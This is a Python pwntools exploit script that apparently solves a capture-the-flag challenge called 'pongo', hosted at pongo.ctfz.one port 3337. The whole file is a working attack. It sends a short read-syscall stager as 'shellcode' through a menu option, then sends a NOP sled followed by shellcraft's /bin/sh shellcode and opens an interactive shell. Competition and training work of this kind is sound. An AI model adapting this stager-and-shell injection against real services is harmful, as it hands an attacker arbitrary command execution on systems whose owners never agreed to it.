#!/usr/bin/env python3


from pwn import *

exe = context.binary = ELF('pongo', checksec=True)
# context.terminal = ["terminator", "-u", "-e"]
context.terminal = ["remotinator", "vsplit", "-x"]


def get_conn(argv=[], *a, **kw):
	host = args.HOST or 'pongo.ctfz.one'
	port = int(args.PORT or 3337)
	if args.GDB:
		return gdb.debug([exe.path] + argv, *a, **kw)
	elif args.REMOTE:
		return remote(host, port)
	else:
		kw.pop('gdbscript')
		return process([exe.path] + argv, *a, **kw)

gdbscript = '''

# run sc
# brva 0x8fc5b
continue
'''
gdbscript = '\n'.join(line for line in gdbscript.splitlines() if line and not line.startswith('#'))
env = {}

io = get_conn(env=env, gdbscript=gdbscript)
r = lambda *a, **k: io.recv(*a, **k)
rl = lambda *a, **k: io.recvline(*a, **k)
ru = lambda *a, **k: io.recvuntil(*a, **k)
cl = lambda *a, **k: io.clean(*a, **k)
s = lambda *a, **k: io.send(*a, **k)
sa = lambda *a, **k: io.sendafter(*a, **k)
sl = lambda *a, **k: io.sendline(*a, **k)
sla = lambda *a, **k: io.sendlineafter(*a, **k)
ia = lambda *a, **k: io.interactive(*a, **k)
li = lambda *a, **k: log.info(*a, **k)
ls = lambda *a, **k: log.success(*a, **k)
def protect_ptr(pos, ptr): return (pos >> 12) ^ ptr



def set_shellcode(sc):
	sla(b'>>>', b'2')
	li(f'{sc.hex()}')
	sl(sc)


set_shellcode(asm(
	'''
xor edi, edi
xor eax, eax
pop rdx
syscall
nop
	'''
))

s(b'\x90' * 0x10 + asm(shellcraft.amd64.linux.sh()))



ia()
